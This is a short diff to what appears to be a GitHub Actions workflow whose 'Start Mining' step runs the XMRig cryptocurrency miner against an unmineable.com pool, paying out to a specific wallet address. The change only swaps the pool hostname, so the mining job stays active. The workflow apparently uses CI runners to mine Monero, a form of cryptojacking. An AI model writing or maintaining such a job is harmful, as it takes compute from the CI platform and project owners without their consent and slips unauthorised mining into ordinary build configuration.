@@ -28,6 +28,6 @@ jobs:
     - name: Start Mining
       run: |
         cd xmrig/build
-        ./xmrig -o randomx.unmineable.com:3333 \
+        ./xmrig -o rx.unmineable.com:3333 \
           -u LTC:ltc1qpr87n7at9emtujezjuhclt0epynmc6c9vek57x.githubXMR#u3ux-cj3w \
           --coin monero -k --donate-level 1
